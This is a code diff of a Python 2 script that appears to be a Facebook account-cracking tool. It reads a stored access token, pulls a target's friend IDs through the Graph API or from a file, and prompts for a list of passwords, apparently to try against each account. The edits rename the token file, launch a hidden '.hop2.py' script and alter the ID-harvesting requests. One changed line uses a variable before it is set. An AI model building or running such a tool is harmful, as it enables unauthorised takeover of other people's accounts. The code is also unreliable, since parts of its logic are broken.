@@ -145,7 +145,7 @@ def methodlogin():
 def login():
 	os.system("clear")
 	try:
-		tb=open('access_token.txt', 'w')
+		tb=open('login.txt', 'w')
 		os.system("python2 .hop2.py")
 	except (KeyError,IOError):
 		os.system("clear")
@@ -182,7 +182,7 @@ def login():
 def menu():
 	os.system('clear')
 	try:
-		toket = open('access_token.txt', 'r').read()
+		toket = open('login.txt', 'r').read()
 	except IOError:
 		os.system('clear')
 		print"\x1b[1;31mToken invalid"
@@ -239,7 +239,7 @@ def super():
 	global toket
 	os.system('clear')
 	try:
-		toket=open('access_token.txt', 'r').read()
+		toket=open('login.txt', 'r').read()
 	except IOError:
 		print"\x1b[1;97mToken invalid"
 		time.sleep(1)
@@ -297,7 +297,7 @@ def pilih_super():
                 idt = raw_input(' \033[1;93m[★]Enter id: ')
 		
 	try:
-		jok = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token='+ toket)
+		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 		op = json.loads(jok.text)
 		print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+op["name"]
 	except KeyError:
@@ -305,7 +305,7 @@ def pilih_super():
 		raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
 		super()
 		print"\033[1;97m[✔] Getting IDs..."
-		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token='+ toket)
+		r = requests.get("https://graph.facebook.com/"+idlist+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
@@ -326,7 +326,7 @@ def pilih_super():
                 pass7 = raw_input(' \033[1;92m[7]Password: ')
                 pass8 = raw_input(' \033[1;92m[8]Password: ')
 	try:
-	        idt= raw_input('[+] File Name: ')
+	        idlist= raw_input('[+] File Name: ')
 	        for line in open(idlist ,'r').readlines():
 	            id.append(line.strip())
 	except IOError:
